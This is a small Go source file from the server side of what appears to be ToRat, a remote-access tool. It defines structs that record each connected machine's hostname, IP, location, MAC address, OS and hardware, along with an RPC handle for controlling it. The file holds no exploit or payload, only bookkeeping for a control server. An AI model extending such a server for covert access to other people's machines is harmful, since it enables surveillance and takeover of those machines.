package server

import (
	"net/rpc"

	"github.com/lu4p/ToRat/shared"
)

type Client struct {
	Hostname string
	Name     string
	Path     string
	IP       string
	Location string
	LastConn int64
	Active   bool
	MacAddr  string
	OS       string
	CPU      string
	GPU      string
	RAM      string
	Drives   string
}

type broadcast struct {
	cwd string
}

type activeClient struct {
	Hostname string
	Wd       shared.Dir
	RPC      *rpc.Client
}

func (ac *activeClient) Data() *Client {
	client := data.Clients[ac.Hostname]
	if client == nil {
		data.Clients[ac.Hostname] = &Client{}
		client = data.Clients[ac.Hostname]
	}

	return client
}
